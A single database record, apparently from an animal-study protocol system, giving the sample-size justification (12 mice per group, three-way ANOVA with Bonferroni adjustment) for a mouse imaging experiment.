	(10087,279,'sample_size_calculation_details','\"Based on our previous experience, there is a genotype difference in FA value of 0.07 with a standard deviation of 0.04. To test this difference we need a total of 12 animals per group at power of 80% and type I error rate of 5%. Sample size calculation is based on three way ANOVA. We calculate 11 mice per group based on a three way ANOVA and 24 pairwise comparisons using Bonferroni adjustment. However, we will use 12 mice per group due to the sensitivity of the calculations to small changes in the standard deviation and due to limited experience with imaging studies with this model. \"','2022-03-31 13:24:05','2022-03-31 13:24:05'),
